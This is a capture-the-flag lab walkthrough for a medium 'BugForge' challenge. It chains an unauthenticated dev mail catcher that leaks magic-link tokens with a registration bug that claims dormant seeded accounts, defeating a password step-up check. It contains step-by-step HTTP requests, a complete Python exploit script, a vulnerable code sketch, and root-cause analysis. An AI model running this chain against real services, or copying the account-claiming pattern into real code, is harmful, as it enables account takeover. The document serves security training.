# vaultly-008 - BugForge Lab Walkthrough

**URL:** https://lab-1786914517976-wc4mo2.labs-app.bugforge.io
**Difficulty:** Medium (Weekly)
**Vulnerability:** Unauthenticated dev-mail-catcher leak chained with an account-claiming registration bug, bypassing a step-up (password re-auth) control
**Flag:** `bug{k6dD30paejADL52jcW9hNqns7RcXXa4P}`

---

## Summary

Vaultly is a multi-tenant document vault SaaS (Next.js App Router). An emergency "treasury
break-glass" recovery key is gated behind a step-up control that requires a genuinely
password-authenticated session, distinct from a lighter-weight magic-link session. Two chained
bugs defeat this control with zero legitimate credentials: a global, unauthenticated dev mail
catcher leaks every outgoing email regardless of recipient, and self-registering with the email
of a seeded-but-never-yet-logged-in org member silently claims that account and lets the caller
set its password.

---

## Tech Stack

- Next.js (App Router, RSC)
- Cookie-based session (`vaultly_session`)
- Multi-tenant org/vault model with role-based access (owner/admin/editor/viewer)
- A "Security Sandbox" dev mail catcher standing in for a real mail provider
- A separate OAuth2 "Connected Apps" surface (`/api/oauth/*`, Bearer tokens)

---

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|----------|--------|------|-------|
| `/api/auth/register` | POST | No | Creates a new org, OR claims an unactivated seeded email |
| `/api/auth/login` | POST | No | Requires a verified, password-set account |
| `/api/auth/magic-link/request` | POST | No | Sends a passwordless sign-in link |
| `/api/auth/magic-link/verify` | GET | No (token) | Consumes the link, also satisfies pending email verification |
| `/dev/inbox` | GET | **None** | **Vulnerable** - shows every outgoing email for every recipient, unauthenticated |
| `/api/vault/breakglass` | POST | Session, step-up | Returns the recovery key, but only for a password-authenticated session |

---

## Discovery

### Step 1 - Fingerprint and map the auth surface

The homepage banner calls this a "Vaultly Security Sandbox" and links directly to a
`/dev/inbox` "Dev email client" page - a strong signal that outgoing mail is being captured
somewhere reachable instead of actually delivered. The login page offers two paths: a normal
email/password form, and a "Prefer passwordless? Email me a sign-in link" magic-link form.

### Step 2 - Confirm the dev mail catcher is unauthenticated

```
GET /dev/inbox
```

No cookie, no token, nothing - and the page renders every captured outgoing email, including
the recipient address and a clickable sign-in link. Requesting a magic link for a known seeded
address and then reloading this page proves the leak:

```
POST /api/auth/magic-link/request  email=owner@acme.test
GET  /dev/inbox
-> shows "Your Vaultly sign-in link" addressed to owner@acme.test with a live
   /api/auth/magic-link/verify?token=... link
```

Following that link logs in as `owner@acme.test` with zero credentials. That alone is a
complete authentication bypass, but it only produces a magic-link session.

### Step 3 - Hit the wall: break-glass demands a *password*-authenticated session

The target org's vault contains a "Break-Glass" folder with a doc explaining the mechanism:
the recovery key is only revealed via `POST /api/vault/breakglass` "in a password-authenticated
session." Calling it on the magic-link session confirms this:

```
POST /api/vault/breakglass  vault_id=<executive vault id>
-> 403 {"error":"step_up_required","detail":"Re-authenticate with your password to reveal."}
```

No amount of header/param spoofing changes this response - it is a genuine server-side
session-state check. The obvious next move (password reset) doesn't exist as a feature at all,
and none of the org's real members share the one demo password shown on the login page.

### Step 4 - Systematically test the registration endpoint against every known seeded email

Since a normal password reset isn't available, the registration flow itself was tested against
every seeded org-member email one by one, rather than only the truly-new addresses tried so
far. Registering with an email that had already been used to sign in (via the magic-link path)
correctly fails:

```
POST /api/auth/register  orgName=X name=X email=owner@acme.test password=MyOwnPassword
-> /register?error=An account with that email already exists.
```

But registering with a seeded member's email that had **never** been logged into yet behaves
completely differently:

```
POST /api/auth/register  orgName=X name=X email=admin@acme.test password=MyOwnPassword
-> 303 /login?pending=1
-> flash: "Account claimed. Check your email for a sign-in link to verify your address."
```

The account was silently "claimed" and now has an attacker-chosen password set on it, pending
email verification.

### Step 5 - Close the loop with the same mail-catcher leak

Logging in immediately with that password fails ("Please verify your email before signing
in."). Requesting an ordinary magic-link sign-in for the same address and consuming the token
via the same unauthenticated `/dev/inbox` page satisfies that verification requirement as a
side effect:

```
POST /api/auth/magic-link/request  email=admin@acme.test
GET  /dev/inbox                                    -> grab the newest token for that address
GET  /api/auth/magic-link/verify?token=...          -> consumes it
POST /api/auth/login  email=admin@acme.test password=MyOwnPassword
-> 303 /dashboard, real vaultly_session cookie set
```

This is now a genuinely password-authenticated session, because the caller genuinely knows the
password - it was set by the caller in step 4.

### Step 6 - Reveal the recovery key

```
POST /api/vault/breakglass  vault_id=<executive vault id, read from /dashboard>
-> 200 {"vault":"Executive","record":"treasury-break-glass",
        "recovery_key":"bug{k6dD30paejADL52jcW9hNqns7RcXXa4P}",
        "note":"Emergency treasury key. Rotate after any use."}
```

---

## Proof of Concept

```python
import re
import urllib.parse
import urllib.request

BASE = "https://lab-1786914517976-wc4mo2.labs-app.bugforge.io"
TARGET_EMAIL = "admin@acme.test"
MY_PASSWORD = "AutoExploit12345!"


class NoRedirect(urllib.request.HTTPErrorProcessor):
    def http_response(self, request, response):
        return response
    https_response = http_response


opener = urllib.request.build_opener(NoRedirect)


def post_form(path, fields, cookie=None):
    data = urllib.parse.urlencode(fields).encode()
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    if cookie:
        headers["Cookie"] = cookie
    req = urllib.request.Request(BASE + path, data=data, headers=headers, method="POST")
    with opener.open(req, timeout=10) as r:
        return r.status, r.read().decode(), dict(r.headers)


def get(path, cookie=None):
    headers = {"Cookie": cookie} if cookie else {}
    req = urllib.request.Request(BASE + path, headers=headers)
    with opener.open(req, timeout=10) as r:
        return r.status, r.read().decode(), dict(r.headers)


# 1. Claim the never-yet-activated seeded account with our own password.
status, _, headers = post_form(
    "/api/auth/register",
    {"orgName": "AutoClaim", "name": "Auto Claim", "email": TARGET_EMAIL, "password": MY_PASSWORD},
)
assert "pending=1" in (headers.get("Location") or ""), "email already activated, try another"

# 2. Request a magic link for that same email.
post_form("/api/auth/magic-link/request", {"email": TARGET_EMAIL})

# 3. Read the unauthenticated dev mail catcher and grab the newest token for it.
_, inbox_html, _ = get("/dev/inbox")
cards = inbox_html.split('<div class="card"')
token = next(
    re.search(r"token=([A-Za-z0-9_-]+)", c).group(1)
    for c in reversed(cards) if TARGET_EMAIL in c
)

# 4. Consume it - this also satisfies the pending email-verification requirement.
get(f"/api/auth/magic-link/verify?token={token}")

# 5. Now a real password login works.
status, _, headers = post_form(
    "/api/auth/login", {"email": TARGET_EMAIL, "password": MY_PASSWORD, "next": "/dashboard"}
)
cookie = headers["Set-Cookie"].split(";")[0]

# 6. Find the target vault id and reveal the recovery key.
_, dash_html, _ = get("/dashboard", cookie=cookie)
vault_id = re.search(r'href="/vaults/(\d+)"', dash_html).group(1)
_, breakglass_body, _ = post_form("/api/vault/breakglass", {"vault_id": vault_id}, cookie=cookie)
print(breakglass_body)
# -> {"vault":"Executive","record":"treasury-break-glass",
#     "recovery_key":"bug{k6dD30paejADL52jcW9hNqns7RcXXa4P}", ...}
```

---

## Dead Ends

| Tried | Result | Lesson |
|---|---|---|
| Header/param spoofing the step-up state (`X-Step-Up`, `auth_method`, `password` body field, etc.) | Always `403 step_up_required` | Real server-side session-state check, not client-trusted |
| Any password-reset endpoint (`/api/auth/reset*`, `/api/auth/forgot-password`, `/api/auth/change-password`) | All 404 | Feature genuinely does not exist in this build |
| Re-registering an already-activated seeded email | "account already exists", no overwrite | Global email uniqueness is correctly enforced |
| Session-fixation across accounts (logging into a different account in the same cookie jar) | Session just rotates cleanly to the new identity | No shared/coarse step-up flag to piggyback on |
| Shared demo password against every seeded org member | Only worked for the one account actually listed on the login page | Other members have real, unknown per-instance passwords |
| Inviting a new member and visiting the shown `/invite/<token>` link | Permanent 404 under every HTTP method, with/without auth, real browser nav included | Decorative, non-functional feature |
| SSRF via the "Import from URL" file feature | Hostname blocklist correctly blocks loopback/link-local in every common encoding | Real, working defense |
| CORS headers on sensitive endpoints | No `Access-Control-Allow-Origin` set anywhere | Not the bug this time |
| Stored XSS via file upload (SVG/HTML) | CSP plus forced `text/plain`/download coercion | Real, working defense |
| OAuth2 "Connected Apps" Bearer token against `/api/vault/breakglass` | Flat 401, ignores `Authorization` entirely | That endpoint is cookie-session only |

---

## Root Cause

Two independent bugs compound into the bypass:

1. `/dev/inbox` has no authentication check at all and returns every captured outgoing email
   for every recipient - a pure information-disclosure bug that alone allows full account
   takeover of any seeded identity via the passwordless magic-link flow.
2. The registration handler, on seeing an email that already belongs to a seeded-but-dormant
   account, updates that account's password instead of rejecting the request outright:

```javascript
// Approximate vulnerable pattern
async function register(email, password, orgName) {
  const existing = await db.findUserByEmail(email);
  if (existing && existing.hasLoggedInBefore) {
    return { error: "An account with that email already exists." };
  }
  if (existing) {
    // Dormant seeded account - silently claims it instead of refusing.
    await db.setPassword(existing.id, password);
    await db.setEmailVerified(existing.id, false);
    return { redirect: "/login?pending=1" };
  }
  return await db.createOrgAndOwner(orgName, email, password);
}
```

Because the resulting "pending" email verification is satisfied by the same magic-link email
type that `/dev/inbox` already leaks, an attacker never needs real access to the target's
inbox at any step of the chain.

---

## CWE / OWASP

- **CWE-284**: Improper Access Control (`/dev/inbox` unauthenticated)
- **CWE-640**: Weak Password Recovery Mechanism (claiming a dormant account via registration)
- **CWE-306**: Missing Authentication for Critical Function
- **OWASP A07:2021** - Identification and Authentication Failures
